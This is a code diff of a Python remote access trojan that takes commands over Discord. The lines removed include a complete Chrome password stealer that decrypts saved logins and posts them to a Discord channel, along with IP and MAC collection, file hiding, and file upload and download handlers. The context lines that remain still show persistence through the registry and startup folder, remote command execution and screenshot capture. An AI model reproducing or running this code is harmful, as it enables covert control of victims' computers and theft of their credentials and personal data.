@@ -39,9 +39,6 @@ client = discord.Client(intents=intents)
 
 hwid = ''
 
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-
 @client.event
 async def on_ready():
     first_run = True
@@ -69,21 +66,6 @@ async def on_ready():
         await guild.create_text_channel('creds', category=category)
         
         for channel in category.channels:
-            if channel.name == 'creds':
-                creds = cred_stealer()
-                if len(creds) > 2000:
-                    t =  creds[2000:]
-                    creds = creds[:2000]
-                    
-                    await msg.channel.send(creds.decode())
-                    
-                    if t:
-                        await msg.channel.send(t.decode())
-                    
-                    creds = b''
-                    t = b''
-                
-                await channel.send(creds)
                 
             if channel.name == 'info':
                 
@@ -98,23 +80,8 @@ async def on_ready():
                 ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
                 username = os.getenv("UserName")
                 hostname = os.getenv("COMPUTERNAME")
-                
-                url = 'http://ipinfo.io/json'
-                response = urllib.request.urlopen(url)
-                data = json.load(response)
-
-                IP=data['ip']
-                org=data['org']
-                city = data['city']
-                country=data['country']
-                region=data['region']
-                
-                
-                
-                mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')
 
                 info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\n\nOS: {}\nCPU: {}\nGPU: {}\nRAM: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, computer_os, cpu, gpu, ram, username, hostname, is_admin)
-                info_buffer += "IP: {}\nOrg: {}\nCity: {}\nRegion: {}\nCountry: {}\n\nMAC Details:\n{}".format(IP, org, city, region, country, mac)
                 
                 await channel.send(info_buffer)                
                 
@@ -164,37 +131,6 @@ async def on_message(msg):
                 response = prefix + response
             
             await msg.channel.send(response.decode())
-
-        elif command == "kill":
-            p = killProc(args)
-            
-            await msg.channel.send(p)
-        
-        elif str_msg == "hide":
-            p = hideFile()
-            
-            if p is None:
-                p = "Successfully hid file"
-                
-            await msg.channel.send(p)
-
-        elif str_msg == "unhide":
-            p = unhideFile()
-            
-            if p is None:
-                p = "Successfully unhid file"
-                
-            await msg.channel.send(p)
-                
-        elif command == "download" or command == "dl":
-            try:
-                await msg.channel.send(file=discord.File(args))
-                
-            except Exception as e:
-                await msg.channel.send(e)
-                
-        elif str_msg == "upload" or str_msg == "ul":
-            await upload(msg)
             
         elif str_msg == "ss" or str_msg == "screenshot":
             s = getScreenshot()
@@ -206,16 +142,6 @@ async def on_message(msg):
                 
             else:
                 await msg.channel.send("Failed to take screenshot.")
-                
-        elif str_msg == "listwindows" or str_msg == "lw":
-            p = printWindows()
-            
-            await msg.channel.send(p)
-        
-        elif str_msg == "creddump" or str_msg == "cred":
-            dump = cred_stealer()
-            
-            await msg.channel.send(dump)
             
         elif str_msg == "persistence" or str_msg == "pt":            
             p = addPersistence()
@@ -225,34 +151,6 @@ async def on_message(msg):
                 result = "Successfully added persistence."
                 
             await msg.channel.send(result)
-
-def killProc(pid):
-    try:
-        p = subprocess.run(["taskkill","/F","/PID",pid],stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
-    except Exception as p:
-        pass
-        
-    return p
-    
-def hideFile():
-    p = None
-    try:
-        subprocess.run(["attrib","+H",filename],check=True)
-        
-    except Exception as p:
-        pass
-        
-    return p
-        
-def unhideFile():
-    p = None
-    try:
-        subprocess.run(["attrib","-H",filename],check=True)
-        
-    except Exception as p:
-        pass
-        
-    return p
         
 def addPersistence():
     s = addToRegistry()
@@ -261,27 +159,6 @@ def addPersistence():
         s = addToStartup()
         
     return s
-    
-async def upload(msg):
-    if msg.attachments == "[]":
-        pass
-    else:
-        try:
-            fname = msg.attachments[0].filename
-            
-            await msg.attachments[0].save(fp="C:\\Users\\Public\\Downloads\\{}".format(fname))
-            await msg.channel.send("File saved to public downloads directory.")
-        except IndexError:
-            await msg.channel.send("Failed to upload...")
-
-def printWindows():
-    window_list = listWindows()
-    str_w_l = 'Active Windows:\n\n'
-    
-    for window in window_list:
-        str_w_l += "Window: " + window + "\n"
-        
-    return str_w_l
 
 def addToStartup():
     try:
@@ -327,21 +204,6 @@ def runCommand(command):
         return iter(p.stdout.readline, b'')    
     except Exception as p:
         return p
-        
-#Gets all open windows
-def winEnumHandler(window_name, w_list):
-    if win32gui.IsWindowVisible(window_name):
-        str_w = win32gui.GetWindowText(window_name)
-        
-        if str_w != '' and str_w != ' ' and str_w != 'Settings':    
-            w_list.append("{}".format(str_w))
-
-#Returns a list of open windows
-def listWindows():  
-    win_list = []    
-    win32gui.EnumWindows(winEnumHandler, win_list)
-    
-    return win_list
         
 #Get screenshot of current window
 def getScreenshot(path=None):
@@ -407,75 +269,6 @@ def isAdmin():
         return False
 
 #Credits to LimerBoy for cred_stealer
-def get_secret_key():
-    try:
-        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        secret_key = secret_key[5:] 
-        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        return secret_key
-    except Exception as e:
-
-        return None
-    
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
-
-def decrypt_password(ciphertext, secret_key):
-    try:
-        initialisation_vector = ciphertext[3:15]
-        encrypted_password = ciphertext[15:-16]
-        cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password)
-        decrypted_pass = decrypted_pass.decode()  
-        return decrypted_pass
-    except Exception as e:
-        return ""
-    
-def get_db_connection(chrome_path_login_db):
-    try:
-        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
-        return sqlite3.connect("Loginvault.db")
-    except Exception as e:
-        return None
-       
-def cred_stealer():
-    response = ''
-    try:
-        secret_key = get_secret_key()
-        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-        
-        for folder in folders:
-            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
-            conn = get_db_connection(chrome_path_login_db)
-            
-            if(secret_key and conn):
-                cursor = conn.cursor()
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                
-                for index,login in enumerate(cursor.fetchall()):
-                    url = login[0]
-                    username = login[1]
-                    ciphertext = login[2]
-                    
-                    if(url!="" and username!="" and ciphertext!=""):
-                        decrypted_password = decrypt_password(ciphertext, secret_key)
-                        response += "Sequence: %d\n"%(index)
-                        response += "URL: %s\nUser Name: %s\nPassword: %s\n\n"%(url,username,decrypted_password)
-                        response += "*"*50
-                        response += "\n"
-                cursor.close()
-                conn.close()
-                os.remove("Loginvault.db")
-    except Exception as e:
-        pass
-        
-    return response
 
 def exit_handler():
     message = hwid + " Has Disconnected."
